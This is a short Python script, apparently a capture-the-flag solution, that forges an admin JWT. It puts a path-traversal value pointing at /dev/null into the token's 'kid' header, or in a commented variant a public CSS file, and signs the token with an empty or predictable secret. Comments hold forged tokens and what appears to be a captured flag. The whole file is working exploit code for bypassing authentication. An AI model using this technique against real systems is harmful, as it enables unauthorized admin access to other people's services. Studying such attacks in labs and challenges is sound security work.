import hmac
import base64
import hashlib

# header = b'{"typ":"JWT","alg":"HS256","kid":"public/css/bootstrap.css"}'
header = b'{"typ":"JWT","alg":"HS256","kid":"../../../../../../../../dev/null"}'
payload = b'{"user":"admin"}'

header = base64.encodebytes(header).replace(b'=',b'').replace(b'\n',b'')
payload = base64.encodebytes(payload).replace(b'=',b'').replace(b'\n',b'')

data = header + b'.' + payload
secret = ''
# secret = open('bootstrap.css').read()

signature = base64.urlsafe_b64encode(hmac.new(secret.encode(), data, digestmod=hashlib.sha256).digest())
token = data + b'.' + signature
print(token)

# a91806f7-7bd8-4565-9f0f-0d891c40cc36
# eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIn0.eyJ1c2VyIjoiYWRtaW4ifQ.J56uB--4xhv8WuIaTmjevXEGLCQ7YSmrKIhFmfD3mY8
# eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6InB1YmxpYy9jc3MvYm9vdHN0cmFwLmNzcyJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gK2VvpvGOyAvhyUzGwWFBliusBVqm_0mOSew9aO6yCM

